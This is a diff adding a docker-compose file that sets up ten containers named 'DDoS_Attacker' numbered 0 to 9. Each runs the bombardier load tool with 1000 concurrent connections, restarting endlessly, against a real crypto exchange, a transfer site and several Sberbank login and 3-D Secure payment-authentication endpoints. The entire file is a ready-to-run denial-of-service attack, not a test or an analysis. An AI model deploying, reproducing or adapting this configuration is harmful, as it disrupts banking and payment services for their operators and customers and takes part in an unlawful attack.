@@ -1,0 +1,53 @@
+version: "3.9"
+services:
+  s0:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_0"
+    command: [ "-c", "1000", "-d", "60s", "-l", "https://mine.exchange/" ]
+    restart: "always"
+  s1:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_1"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://betatransfer.org/"]
+    restart: "always"
+  s2:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_2"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://scr.online.sberbank.ru/api/fl/idgib-w-3ds"]
+    restart: "always"
+  s3:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_3"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://3dsec.sberbank.ru/mportal3/auth/login"]
+    restart: "always"
+  s4:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_4"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://acs1.sbrf.ru"]
+    restart: "always"
+  s5:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_5"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://acs2.sbrf.ru"]
+    restart: "always"
+  s6:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_6"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://acs3.sbrf.ru"]
+    restart: "always"
+  s7:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_7"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://acs4.sbrf.ru"]
+    restart: "always"
+  s8:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_8"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://acs5.sbrf.ru"]
+    restart: "always"
+  s9:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_9"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://acs6.sbrf.ru"]
+    restart: "always"
+
